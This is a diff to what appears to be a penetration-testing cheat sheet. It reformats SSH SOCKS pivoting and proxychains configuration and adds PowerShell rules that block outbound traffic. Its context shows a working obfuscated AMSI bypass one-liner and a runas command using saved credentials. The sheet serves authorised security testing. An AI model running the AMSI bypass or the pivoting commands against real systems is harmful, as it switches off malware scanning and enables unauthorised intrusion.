@@ -498,19 +498,21 @@ IPTables: `iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT –to 192.168
 
 Setup a dynamic local SOCKS proxy: `ssh -fN -D 127.0.0.1:8888 user@target-host.com`\
 Config file: eg `pivot.conf`\
-`strict_chain # Do each connection via the proxies listed in order, alts: dynamic_chain, random_chain`\
-`quiet_mode # No output`\
-`proxy_dns # Proxy DNS requests`\
-`remote_dns_subnet 224`\
-`tcp_read_time_out 15000`\
-`tcp_connect_time_out 8000`\
-`localnet 127.0.0.0/255.0.0.0 # Exclusions`
+```
+strict_chain # Do each connection via the proxies listed in order, alts: dynamic_chain, random_chain
+quiet_mode # No output
+proxy_dns # Proxy DNS requests
+remote_dns_subnet 224
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+localnet 127.0.0.0/255.0.0.0 # Exclusions
  
-`[ProxyList]`\
-`socks4  127.0.0.1 8888`
+[ProxyList]
+socks4  127.0.0.1 8888
 
-Usage: `proxychains4 -f ./pivot.conf wget http://remote-network-target-host.com`\
-DNS Resolution: `proxyresolv www.target-host.com`\
+Usage: `proxychains4 -f ./pivot.conf wget http://remote-network-target-host.com
+DNS Resolution: `proxyresolv www.target-host.com
+```
 Specify alternate configuration:`-f`
 
 ### Netsh pivot
@@ -534,6 +536,12 @@ Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
 Amsi bypass:
 ```
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+### Firewall rule:
+```
+New-NetFirewallRule -DisplayName "name" -RemoteAddress -Direction Outbound -Action Block -Enabled True
+New-NetFirewallRule -DisplayName "name" -Program program.exe -Direction Outbound -Action Block -Enabled True
 ```
 
 ## Host enum (probably detected)
